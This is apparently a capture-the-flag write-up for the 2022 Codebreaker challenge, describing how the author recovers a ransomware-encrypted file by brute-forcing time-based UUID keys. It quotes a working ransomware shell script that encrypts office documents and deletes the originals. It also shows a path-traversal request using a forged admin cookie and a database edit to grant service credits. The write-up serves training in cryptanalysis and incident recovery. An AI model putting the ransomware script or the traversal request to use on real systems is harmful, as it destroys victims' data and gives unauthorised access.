# Task 9

## Background
> Unfortunately, looks like the ransomware site suffered some data loss, and doesn't have the victim's key to give back! I guess they weren't planning on returning the victims' files, even if they paid up.
>
> There's one last shred of hope: your cryptanalysis skills. We've given you one of the encrypted files from the victim's system, which contains an important message. Find the encryption key, and recover the message.
> ### Downloads
> - Encrypted file recovered from the victim's system (important_data.pdf.enc)
> ### Prompt
> Enter the value recovered from the file

## Writeup
TL;DR: The file is encrypted using AES-128 in CBC mode, with a key that is the first 16 bytes of a variant 1 UUID. Using the timestamp from `keygeneration.log`, create and test UUIDs that could have been generated leading up to that point, one of which will successfully decrypt the file.

The first thing to do is find out how the victim's files were encrypted. From the attacker's tools recovered as part of task A2, we have a likely method in `ransom.sh`.
```bash
#!/bin/sh
read -p "Enter encryption key: " key
hexkey=`echo -n $key | ./busybox xxd -p | ./busybox head -c 32`
export hexkey
./busybox find $1 -regex '.*\.\(pdf\|doc\|docx\|xls\|xlsx\|ppt\|pptx\)' -print -exec sh -c 'iv=`./openssl rand -hex 16`; echo -n $iv > $0.enc; ./openssl enc -e -aes-128-cbc -K $hexkey -iv $iv -in $0 >> $0.enc; rm $0' \{\} \; 2>/dev/null
```

This script takes the first 16 bytes of stdin, then searches for a bunch of files on the victim's system, replacing each with a file containing the hex-encoded random IV, followed by the contents of the file, encrypted using AES-128 in CBC mode. Taking a quick look at the file we were given, it seems to follow this format.
```bash
$ head -c 64 important_data.pdf.enc | xxd
00000000: 3638 3466 3966 3536 3437 3062 6337 6339  684f9f56470bc7c9
00000010: 3039 3338 3837 3061 6366 3037 6137 3038  0938870acf07a708
00000020: 86db d403 1d47 8254 0373 ad57 68d5 7f82  .....G.T.s.Wh...
00000030: 9f0d 6fa5 c3c6 fe1c 4982 57a7 1d8b 9cf8  ..o.....I.W.....
```

Obviously, there must be some trick to reducing the key space, since an exhaustive search is infeasible, to put it lightly. We know that the attacker used the ransomware-as-a-service site to handle the demand payment, so it seems logical that the key they used also came from there. Since we have the `keyMaster` binary used to generate keys, we can simply run it to see what comes out.
```bash
$ ./keyMaster lock 100 1.00 LamentableConservative
{"error":"no such table: hackers"}
```

Well, that's unfortunate. It seems to be looking for a database table called "hackers", which it can't find because we don't even have the database file it's trying to read. To actually find which file it tries to access, we can either look through the disassembly, or run it through `strace`. The latter is easier, so that's what I went with.
```bash
$ strace ./keyMaster lock 100 1.00 LamentableConservative 2>&1 | grep "openat"
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libdl.so.2", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpthread.so.0", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/sys/kernel/mm/transparent_hugepage/hpage_pmd_size", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 6
openat(AT_FDCWD, "/opt/keyMaster/keyMaster.db", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 6
openat(AT_FDCWD, "/opt/keyMaster/keyMaster.db", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 7
```

The file in question appears to be `/opt/keyMaster/keyMaster.db`, so let's get that from the server, then try running `keyMaster` again.
```bash
$ python3 forge_token.py 9076 > admin_cookie
$ curl --cookie admin_cookie "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/fetchlog?log=../../keyMaster/keyMaster.db" > keyMaster.db
$ ./keyMaster lock 100 1.00 LamentableConservative
{"error":"Insufficient credit.  Please contact an administrator to reload."}
```

Well, there's the "as-a-service" part of "ransomware-as-a-service". But since we have the database file, we should just be able to give ourselves some credits, and then try again.
```
$ file keyMaster.db
keyMaster.db: SQLite 3.x database, last written using SQLite version 3027002
$ sqlite3
...
sqlite> .schema
CREATE TABLE customers (customerId INTEGER, encryptedKey TEXT, expectedPayment REAL, hackerName TEXT, creationDate TEXT);
CREATE TABLE hackers (hackerName TEXT, credits INTEGER);
sqlite> SELECT * FROM hackers WHERE hackerName='LamentableConservative';
LamentableConservative|0
sqlite> UPDATE hackers SET credits=1000 WHERE hackerName='LamentableConservative';
$ ./keyMaster lock 100 1.00 LamentableConservative
{"plainKey":"07ed85e7-6df4-11ed-bc56-0242ac11","result":"ok"}
```

That's more like it! The `plainKey` looks like a [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier) (though the last 4 characters seem to have been chopped off), so we have the key space reduction we're looking for. Reading the Wikipedia page, the UUID we get out of `keyMaster` seems to be a "version 1, variant 1" UUID, which are based on the time and MAC address. Time is encoded as the number of 100-nanosecond intervals since midnight UTC on October 15, 1582.

We know from the ransom script that only the first 16 bytes of the key were used. Since this stays entirely within the time portion of the UUID, we don't need to care about the other parts (clock sequence and node id). Then, all we need to do is find out when the attacker generated their key. Fortunately, we have `keygeneration.log`, which just so happens to correlate every generated key with a timestamp of when it was generated.

Obviously, the timestamp from the log won't match exactly with when the key was generated. Since we have the key-encrypting-key from task 8, and a bunch of generated keys in the `customers` table, we can look at the time differences between the log timestamp and the timestamp encoded in the key.
```
$ python3 analyze_keys.py
23365 2021-01-02T14:24:50-05:00 b'2e29dfeb-4d30-11eb-b97d-05b17eac' 0:00:08
21086 2021-01-10T18:32:36-05:00 b'1e7436ee-539c-11eb-b97d-05b17eac' 0:00:08
45041 2021-01-12T23:53:25-05:00 b'44453351-555b-11eb-b97d-05b17eac' 0:00:08
19928 2021-01-28T05:48:26-05:00 b'593aa07a-6156-11eb-b97d-05b17eac' 0:00:09
15552 2021-01-29T14:58:03-05:00 b'4b7b97f3-626c-11eb-b97d-05b17eac' 0:00:08
10749 2021-02-10T08:12:23-05:00 b'9ca6868c-6ba1-11eb-b97d-05b17eac' 0:00:11
...
```

The time difference seems to be between 6 and 11 seconds, so now we can simply create every 16-byte UUID head from 11 seconds to 6 seconds before the log timestamp, and try to use each to decrypt the given file.
```
$ g++ -Wall -std=c++11 -O3 main.cpp keytester.cpp evplib.cpp -o main -lcrypto && ./main
IV: 684f9f56470bc7c90938870acf07a708
24000000 (21.82%): 3dbd8000-b42d-11ec
!!FOUND KEY!!: 3dcbb0a8-b42d-11ec 
Elapsed sec: 24.5933
Tested 24929961 keys
```

Opening up the decoded file created by the program, we get a nice congratulatory message and the answer to the task. Putting this into the answer box, we get our task 9 badge, and finish the 2022 Codebreaker challenge!

## Additional notes
Due to a backend bug, the version of `keyMaster` that I originally downloaded tried to coerce the _encrypted_ key into the "plainKey" output field. This resulted in me going down a 2-month long UTF-8 encoding rabbit hole, during which I needed to search a much larger key space than what was intended. To do this, I rewrote my search script in C++, which is why both `solve.py` and `cpp/` exist. The C++ version gives a 20-30 times speedup compared to the Python on my machine (1 minute for 15 seconds worth of UUIDs vs. 2 minutes for 0.5 seconds worth), which is a really great reminder of just how slow Python is.